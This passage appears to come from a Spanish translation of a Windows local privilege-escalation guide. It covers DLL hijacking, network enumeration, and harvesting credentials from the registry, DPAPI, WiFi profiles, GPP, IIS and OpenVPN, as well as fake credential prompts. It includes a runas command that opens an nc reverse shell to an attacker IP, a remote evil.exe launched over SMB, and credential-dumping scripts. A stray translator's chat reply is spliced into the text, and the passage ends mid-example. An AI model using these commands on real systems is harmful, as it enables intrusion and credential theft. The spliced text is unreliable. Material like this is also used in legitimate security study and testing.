DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigaciones para desarrolladores
- Siempre establecer FILE_DEVICE_SECURE_OPEN al crear objetos de dispositivo destinados a ser restringidos por una DACL.
- Validar el contexto del caller para operaciones privilegiadas. Añadir comprobaciones PP/PPL antes de permitir la terminación de procesos o la devolución de handles.
- Restringir IOCTLs (access masks, METHOD_*, input validation) y considerar modelos brokered en lugar de privilegios directos del kernel.

Detection ideas for defenders
- Monitorizar aperturas en user-mode de nombres de dispositivo sospechosos (e.g., \\ .\\amsdk*) y secuencias específicas de IOCTL indicativas de abuso.
- Aplicar la vulnerable driver blocklist de Microsoft (HVCI/WDAC/Smart App Control) y mantener sus propias allow/deny lists.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para más información sobre cómo abusar de esta comprobación:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Red

### Recursos compartidos
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Comprueba si hay otros equipos conocidos hardcoded en el hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de red y DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Puertos Abiertos

Comprueba si hay **servicios restringidos** accesibles desde el exterior
```bash
netstat -ano #Opened ports?
```
### Tabla de enrutamiento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabla ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reglas del Firewall

[**Consulta esta página para comandos relacionados con el Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar reglas, crear reglas, desactivar, desactivar...)**

Más[ comandos para enumeración de red aquí](../basic-cmd-for-pentesters.md#network)

### Subsistema de Windows para Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
El binario `bash.exe` también se puede encontrar en `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si consigues el usuario root, puedes escuchar en cualquier puerto (la primera vez que uses `nc.exe` para escuchar en un puerto, pedirá vía GUI si `nc` debe ser permitido por el firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar bash como root fácilmente, puedes probar `--default-user root`

Puedes explorar el sistema de archivos de `WSL` en la carpeta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciales de Windows

### Credenciales de Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault almacena credenciales de usuario para servidores, sitios web y otros programas que **Windows** puede **iniciar automáticamente la sesión de los usuarios**. A primera vista, esto podría parecer que los usuarios pueden almacenar sus credenciales de Facebook, Twitter, Gmail, etc., para iniciar sesión automáticamente desde los navegadores. Pero no es así.

Windows Vault almacena credenciales que Windows puede iniciar automáticamente la sesión de los usuarios, lo que significa que cualquier **aplicación de Windows que necesite credenciales para acceder a un recurso** (servidor o sitio web) **puede hacer uso de este Credential Manager** & Windows Vault y usar las credenciales suministradas en lugar de que los usuarios introduzcan el nombre de usuario y la contraseña todo el tiempo.

A menos que las aplicaciones interactúen con Credential Manager, no creo que sea posible que utilicen las credenciales para un recurso dado. Por lo tanto, si tu aplicación quiere hacer uso de la bóveda, debería de alguna manera **comunicarse con el credential manager y solicitar las credenciales para ese recurso** desde la bóveda de almacenamiento predeterminada.

Usa el comando `cmdkey` para listar las credenciales almacenadas en la máquina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Entonces puedes usar `runas` con las opciones `/savecred` para utilizar las credenciales guardadas. El siguiente ejemplo llama a un binary remoto vía un SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` con un conjunto de credenciales proporcionadas.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

La **API de Protección de Datos (DPAPI)** proporciona un método para el cifrado simétrico de datos, utilizado principalmente en el sistema operativo Windows para el cifrado simétrico de claves privadas asimétricas. Este cifrado aprovecha un secreto del usuario o del sistema para contribuir significativamente a la entropía.

**DPAPI permite el cifrado de claves mediante una clave simétrica que se deriva de los secretos de inicio de sesión del usuario**. En escenarios de cifrado del sistema, utiliza los secretos de autenticación de dominio del sistema.

Las claves RSA de usuario cifradas mediante DPAPI se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde `{SID}` representa el [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) del usuario. **La clave DPAPI, co-ubicada con la clave maestra que protege las claves privadas del usuario en el mismo archivo**, típicamente consiste en 64 bytes de datos aleatorios. (Es importante notar que el acceso a este directorio está restringido, impidiendo listar su contenido mediante el comando `dir` en CMD, aunque puede listarse a través de PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puedes usar el **mimikatz module** `dpapi::masterkey` con los argumentos apropiados (`/pvk` o `/rpc`) para descifrarlo.

Los **archivos de credenciales protegidos por la contraseña maestra** suelen ubicarse en:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puedes usar **mimikatz module** `dpapi::cred` con el `/masterkey` apropiado para descifrar.\
Puedes **extraer muchos DPAPI** **masterkeys** de la **memory** con el `sekurlsa::dpapi` module (si eres root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenciales de PowerShell

**PowerShell credentials** se usan a menudo para tareas de **scripting** y automatización como una forma de almacenar credenciales cifradas de manera conveniente. Las credenciales están protegidas usando **DPAPI**, lo que normalmente significa que solo pueden ser descifradas por el mismo usuario en el mismo equipo donde fueron creadas.

Para **descifrar** una credencial PS desde el archivo que la contiene, puedes hacer:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conexiones RDP guardadas

Puedes encontrarlas en `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
y en `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos ejecutados recientemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Administrador de credenciales de Escritorio remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Usa el módulo **Mimikatz** `dpapi::rdg` con el `/masterkey` apropiado para **descifrar cualquier archivo .rdg**\
Puedes **extraer muchos DPAPI masterkeys** de la memoria con el módulo Mimikatz `sekurlsa::dpapi`

### Sticky Notes

A menudo se utiliza la app StickyNotes en estaciones de trabajo Windows para **guardar contraseñas** y otra información, sin darse cuenta de que es un archivo de base de datos. Este archivo se encuentra en `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` y siempre merece la pena buscarlo y examinarlo.

### AppCmd.exe

**Ten en cuenta que para recuperar contraseñas de AppCmd.exe necesitas ser Administrator y ejecutarlo con High Integrity level.**\
**AppCmd.exe** está ubicado en el directorio `%systemroot%\system32\inetsrv\`.\
Si este archivo existe, es posible que se hayan configurado algunas **credentials** y que puedan ser **recuperadas**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Comprueba si `C:\Windows\CCM\SCClient.exe` existe .\
Los instaladores se **ejecutan con privilegios SYSTEM**, muchos son vulnerables a **DLL Sideloading (Info de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Archivos y Registro (Credenciales)

### Credenciales de Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Claves de host SSH de Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys en el registro

SSH private keys pueden almacenarse dentro de la clave del registro `HKCU\Software\OpenSSH\Agent\Keys`, por lo que deberías comprobar si hay algo interesante allí:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Si encuentras alguna entrada dentro de esa ruta probablemente sea una SSH key guardada. Está almacenada cifrada pero puede descifrarse fácilmente usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Más información sobre esta técnica aquí: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Si el servicio `ssh-agent` no está en ejecución y quieres que se inicie automáticamente al arrancar, ejecuta:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Parece que esta técnica ya no es válida. Intenté crear algunas ssh keys, añadirlas con `ssh-add` e iniciar sesión vía ssh en un equipo. El registro HKCU\Software\OpenSSH\Agent\Keys no existe y procmon no identificó el uso de `dpapi.dll` durante la autenticación con clave asimétrica.

### Archivos desatendidos
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
También puedes buscar estos archivos usando **metasploit**: _post/windows/gather/enum_unattend_

Contenido de ejemplo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Copias de seguridad de SAM y SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciales en la nube
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Busca un archivo llamado **SiteList.xml**

### Contraseña GPP en caché

Anteriormente existía una característica que permitía el despliegue de cuentas de administrador local personalizadas en un grupo de máquinas mediante Group Policy Preferences (GPP). Sin embargo, este método tenía fallos de seguridad significativos. En primer lugar, los Group Policy Objects (GPOs), almacenados como archivos XML en SYSVOL, podían ser accedidos por cualquier usuario del dominio. En segundo lugar, las contraseñas dentro de estos GPPs, cifradas con AES256 usando una clave por defecto documentada públicamente, podían ser descifradas por cualquier usuario autenticado. Esto representaba un riesgo serio, ya que podía permitir a usuarios obtener privilegios elevados.

Para mitigar este riesgo, se desarrolló una función para buscar archivos GPP almacenados en caché localmente que contengan un campo "cpassword" que no esté vacío. Al encontrar dicho archivo, la función descifra la contraseña y devuelve un objeto personalizado de PowerShell. Este objeto incluye detalles sobre el GPP y la ubicación del archivo, ayudando a identificar y remediar esta vulnerabilidad de seguridad.

Busca en `C:\ProgramData\Microsoft\Group Policy\history` o en _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior a W Vista)_ estos archivos:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descifrar el cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obtener las contraseñas:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Configuración Web
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Ejemplo de web.config con credenciales:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciales de OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Registros
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Pedir credentials

Siempre puedes **pedir al usuario que introduzca sus credentials o incluso las credentials de otro usuario** si crees que puede conocerlas (ten en cuenta que **pedir** al cliente directamente las **credentials** es realmente **arriesgado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Nombres de archivo posibles que contienen credenciales**

Archivos conocidos que en algún momento contenían **contraseñas** en **texto plano** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
No tengo acceso directo a tu repositorio. Por favor pega aquí el contenido de src/windows-hardening/windows-local-privilege-escalation/README.md y lo traduciré al español manteniendo exactamente la sintaxis Markdown/HTML y las reglas que indicaste.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciales en la Papelera de reciclaje

También deberías revisar la Papelera para buscar credenciales en su interior

Para **recuperar contraseñas** guardadas por varios programas puedes usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro del registro

**Otras posibles claves del registro con credenciales**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historial de navegadores

Debes buscar dbs donde se almacenan las contraseñas de **Chrome o Firefox**.\
También revisa el historial, bookmarks y favoritos de los navegadores, ya que quizá algunas **contraseñas** estén ahí.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Sobrescritura de DLLs COM**

**Component Object Model (COM)** es una tecnología integrada en el sistema operativo Windows que permite la **intercomunicación** entre componentes de software escritos en diferentes lenguajes. Cada componente COM está **identificado mediante un class ID (CLSID)** y cada componente expone funcionalidad a través de una o más interfaces, identificadas mediante interface IDs (IIDs).

Las clases e interfaces COM se definen en el registro bajo **HKEY\CLASSES\ROOT\CLSID** y **HKEY\CLASSES\ROOT\Interface** respectivamente. Este registro se crea al fusionar **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro de los CLSIDs de este registro puedes encontrar la clave hija **InProcServer32**, que contiene un **valor predeterminado** que apunta a una **DLL** y un valor llamado **ThreadingModel** que puede ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) o **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Básicamente, si puedes **sobrescribir cualquiera de las DLLs** que se van a ejecutar, podrías **escalar privilegios** si esa DLL se ejecuta por otro usuario.

Para aprender cómo los atacantes usan COM Hijacking como mecanismo de persistencia consulta:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Búsqueda genérica de contraseñas en archivos y registro**

**Buscar el contenido de archivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Buscar un archivo con un nombre de archivo determinado**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Buscar en el registro nombres de claves y contraseñas**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Herramientas que buscan passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **es un plugin de msf** que creé para **ejecutar automáticamente cada metasploit POST module que busca credentials** dentro de la victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) busca automáticamente todos los archivos que contienen passwords mencionados en esta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) es otra gran herramienta para extraer passwords de un sistema.

La herramienta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) busca **sessions**, **usernames** y **passwords** de varias herramientas que guardan estos datos en texto claro (PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Lee este ejemplo para más información sobre **cómo detectar y explotar esta vulnerabilidad**.](leaked-handle-exploitation.md)\
[Lee este **otro post para una explicación más completa sobre cómo probar y abusar de más open handlers de procesos y threads heredados con diferentes niveles de permisos (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Los segmentos de memoria compartida, referidos como **pipes**, permiten la comunicación entre procesos y la transferencia de datos.

Windows proporciona una característica llamada **Named Pipes**, que permite a procesos no relacionados compartir datos, incluso a través de diferentes redes. Esto se asemeja a una arquitectura cliente/servidor, con roles definidos como **named pipe server** y **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Además, la siguiente herramienta permite **interceptar una comunicación de named pipe con una herramienta como burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **y esta herramienta permite listar y ver todas las pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misceláneo

### Extensiones de archivo que podrían ejecutar cosas en Windows

Visita la página **https://filesec.io/**

### **Monitorización de líneas de comando para contraseñas**

Al obtener una shell como usuario, puede haber tareas programadas u otros procesos ejecutándose que **pasen credenciales en la línea de comandos**. El script abajo captura las líneas de comando de los procesos cada dos segundos y compara el estado actual con el estado anterior, mostrando cualquier diferencia.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si tienes acceso a la interfaz gráfica (vía consola o RDP) y UAC está habilitado, en algunas versiones de Microsoft Windows es posible ejecutar una terminal u otro proceso como "NT\AUTHORITY SYSTEM" desde un usuario sin privilegios.

Esto permite escalar privilegios y eludir UAC al mismo tiempo con la misma vulnerabilidad. Además, no es necesario instalar nada y el binario utilizado durante el proceso está firmado y emitido por Microsoft.

Algunos de los sistemas afectados son los siguientes:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
